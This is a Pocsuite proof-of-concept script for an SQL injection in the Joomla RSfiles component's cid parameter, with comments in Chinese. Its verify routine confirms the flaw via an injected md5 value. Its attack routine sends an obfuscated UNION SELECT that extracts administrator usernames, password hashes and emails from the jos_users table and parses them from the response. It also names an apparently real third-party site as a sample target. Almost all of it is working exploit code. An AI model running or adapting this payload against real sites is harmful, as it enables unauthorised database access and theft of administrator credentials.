#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '78538'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2013-03-18'
    createDate = '2016-01-23'
    updateDate = '2016-01-23'
    references = ['http://www.seebug.org/vuldb/ssvid-78538']
    name = 'Joomla RSfiles Component (cid param) - SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla RSfiles Component'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        joomla组件RSfiles由于对参数cid过滤不严格，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行SQL指令。
    '''
    samples = ['http://www.ccdwoll.org.au/ccd']

    def _attack(self):
        #利用SQL注入读取joomla管理员信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid='
        #利用Union方式读取信息(进行了char编码)
        payload="-1/**/aNd/**/1=0/**/uNioN++sElecT+1,concat(CHAR(36, 126, 126, 126, 36),username,"\
        "CHAR(42, 42, 42),password,CHAR(42, 42, 42),email,CHAR(36, 126, 126, 126, 36))/**/from/**/jos_users--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['AdminInfo']={}
                #用户名
                result['AdminInfo']['Username']=match.group(1)
                #密码
                result['AdminInfo']['Password']=match.group(2)
                #邮箱
                result['AdminInfo']['Email']=match.group(3)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(3.1415)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid='
        #利用union的方式（计算md5(3.1415)）
        payload="-1/**/aNd/**/1=0/**/uNioN++sElecT+1,md5(3.1415)--"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)